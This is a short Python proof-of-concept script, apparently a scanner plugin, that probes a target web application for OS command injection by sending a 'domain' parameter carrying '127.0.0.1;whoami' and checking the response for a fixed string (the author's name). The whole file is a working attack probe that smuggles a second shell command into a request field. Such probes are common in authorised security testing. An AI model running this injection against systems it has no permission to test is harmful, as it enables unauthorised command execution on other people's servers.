__author__ = 'luhaoliang'
import requests
import re

def poc(target):
    target = "{}/?domain=127.0.0.1%3B%20whoami".format(target)
    s = requests.get(target)
    if re.search("luhaoliang",s.content):
        return [1,"command_inject"]
    else:
        return [0,"command_inject"]